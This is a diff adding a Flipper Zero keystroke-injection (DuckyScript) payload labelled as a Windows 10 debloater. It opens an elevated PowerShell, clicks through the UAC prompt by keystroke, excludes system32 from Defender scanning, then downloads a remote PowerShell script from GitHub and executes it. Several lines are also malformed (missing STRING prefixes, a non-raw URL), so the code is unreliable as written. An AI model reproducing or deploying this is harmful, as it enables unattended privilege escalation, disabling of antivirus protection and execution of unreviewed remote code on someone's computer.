@@ -1,0 +1,25 @@
+REM Author: Thomas Alakopsa
+REM Description: Debloats windows 10
+REM Version: 1.0
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING $Script = Invoke-WebRequest 'https://github.com/ThomasAlakopsa/FlipperZero/blob/main/resources/windows10Debloater.ps1'
+ENTER
+DELAY 100
+$ScriptBlock = [Scriptblock]::Create($Script.Content)
+ENTER
+DELAY 100
+Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList ($args + @('someargument'))
+ENTER
+DELAY 100
